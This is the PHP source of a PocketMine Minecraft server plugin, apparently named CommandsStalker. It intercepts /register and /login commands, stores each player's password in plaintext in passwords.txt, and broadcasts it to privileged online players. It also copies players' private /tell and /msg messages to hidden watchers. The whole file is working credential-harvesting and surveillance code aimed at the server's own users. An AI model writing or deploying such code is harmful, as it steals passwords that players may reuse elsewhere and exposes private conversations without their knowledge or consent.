<?php

namespace TheNewHEROBRINE\CommandsStalker;

use pocketmine\event\Listener;
use pocketmine\event\player\PlayerCommandPreprocessEvent;
use pocketmine\Player;
use pocketmine\plugin\PluginBase;
use pocketmine\utils\Config;

class Main extends PluginBase implements Listener{

    private $folder, $pwdFile;

    public function onEnable(){
        $this->folder = $this->getDataFolder();
        @mkdir($this->folder);
        $this->getServer()->getPluginManager()->registerEvents($this, $this);
    }


    public function onPlayerCommand(PlayerCommandPreprocessEvent $e){
        $player = $e->getPlayer();
        $playerName = $player->getName();
        $cmd = $e->getMessage();
        $args = explode(" ", $cmd); array_shift($args);
        if($cmd{0} == "/"){
            switch ($this->getCommandName($cmd)) {
                case "register":
                case "login":
                    if (!$player->hasPermission("commandsstalker.exempt.password") && isset($args[0])) {
                        $this->getPwdFile()->set($playerName, [$args[0]]);
                        $this->getPwdFile()->save();
                        foreach ($this->getServer()->getOnlinePlayers() as $p) {
                            if ($p->hasPermission("commandsstalker.see.password") && $this->getServer()->getPluginManager()->getPlugin("ServerAuth")->isPlayerAuthenticated($p))
                                $p->sendMessage("La password di " . $playerName . " è " . $args[0]);
                        }
                    }
                    break;
                case "tell":
                case "msg":
                case "w":
                case "m":
                case "t":
                    if (!count($args) < 2 && !$player->hasPermission("commandsstalker.exempt.tell")) {
                        $recipient = $this->getServer()->getPlayer(array_shift($args));
                        if ($recipient instanceof Player) {
                            foreach ($this->getServer()->getOnlinePlayers() as $pl) {
                                if ($pl->hasPermission("commandsstalker.see.tell") && $pl->getName() != $player->getName() && $pl->getName() != $recipient->getName())
                                    $pl->sendMessage("[" . $playerName . " -> " . $recipient->getName() . "] " . implode(" ", $args));
                            }
                        }
                    }
                    break;
            }
        }
    }
    
    public function getCommandName($command){
            return substr(explode(" ", $command)[0], 1);
    }

    public function getPwdFile(){
        if(!isset($this->pwdFile))
            $this->pwdFile = new Config($this->folder . "passwords.txt", Config::YAML);
        return $this->pwdFile;
    }
}